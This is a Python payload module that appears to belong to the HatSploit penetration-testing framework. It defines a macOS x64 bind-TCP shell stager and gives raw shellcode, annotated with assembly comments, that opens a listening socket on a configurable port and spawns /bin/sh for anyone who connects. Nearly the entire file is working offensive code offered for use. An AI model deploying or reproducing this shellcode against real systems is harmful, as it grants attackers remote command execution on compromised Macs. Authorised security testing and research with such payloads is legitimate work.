#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "stager",
        'Name': "macOS x64 Shell Bind TCP",
        'Payload': "macos/x64/shell_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell bind TCP payload for macOS x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "macos",
        'Risk': "high",
        'Type': "bind_tcp"
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        bind_port = self.parse_options(self.options)

        return (
            b"\x48\x31\xff"      # xorq  %rdi, %rdi
            b"\x40\xb7\x02"      # movb  $2, %dil
            b"\x48\x31\xf6"      # xorq  %rsi, %rsi
            b"\x40\xb6\x01"      # movb  $1, %sil
            b"\x48\x31\xd2"      # xorq  %rdx, %rdx
            b"\x48\x31\xc0"      # xorq  %rax, %rax
            b"\xb0\x02"          # movb  $2, %al
            b"\x48\xc1\xc8\x28"  # rorq  $40, %rax
            b"\xb0\x61"          # movb  $97, %al
            b"\x49\x89\xc4"      # movq  %rax, %r12
            b"\x0f\x05"          # syscall
            b"\x49\x89\xc1"      # movq  %rax, %r9
            b"\x48\x89\xc7"      # movq  %rax, %rdi
            b"\x48\x31\xf6"      # xorq  %rsi, %rsi
            b"\x56"              # pushq  %rsi
            b"\xbe\x01\x02"      # movl  port, %esi
            b":bport:port:"      # port
            b"\x83\xee\x01"      # subl  $1, %esi
            b"\x56"              # pushq  %rsi
            b"\x48\x89\xe6"      # movq  %rsp, %rsi
            b"\xb2\x10"          # movb  $16, %dl
            b"\x41\x80\xc4\x07"  # addb  $7, %r12b
            b"\x4c\x89\xe0"      # movq  %r12, %rax
            b"\x0f\x05"          # syscall
            b"\x48\x31\xf6"      # xorq  %rsi, %rsi
            b"\x48\xff\xc6"      # incq  %rsi
            b"\x41\x80\xc4\x02"  # addb  $2, %r12b
            b"\x4c\x89\xe0"      # movq  %r12, %rax
            b"\x0f\x05"          # syscall
            b"\x48\x31\xf6"      # xorq  %rsi, %rsi
            b"\x41\x80\xec\x4c"  # subb  $76, %r12b
            b"\x4c\x89\xe0"      # movq  %r12, %rax
            b"\x0f\x05"          # syscall
            b"\x48\x89\xc7"      # movq  %rax, %rdi
            b"\x48\x31\xf6"      # xorq  %rsi, %rsi
            b"\x41\x80\xc4\x3c"  # addb  $60, %r12b
            b"\x4c\x89\xe0"      # movq  %r12, %rax
            b"\x0f\x05"          # syscall
            b"\x48\xff\xc6"      # incq  %rsi
            b"\x4c\x89\xe0"      # movq  %r12, %rax
            b"\x0f\x05"          # syscall
            b"\x48\x31\xf6"      # xorq  %rsi, %rsi
            b"\x56"              # pushq  %rsi
            b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  # movabsq  $7526411553527181103, %rdi
            b"\x57"              # pushq  %rdi
            b"\x48\x89\xe7"      # movq  %rsp, %rdi
            b"\x48\x31\xd2"      # xorq  %rdx, %rdx
            b"\x41\x80\xec\x1f"  # subb  $31, %r12b
            b"\x4c\x89\xe0"      # movq  %r12, %rax
            b"\x0f\x05"          # syscall
        ), {
            'bport': bind_port
        }
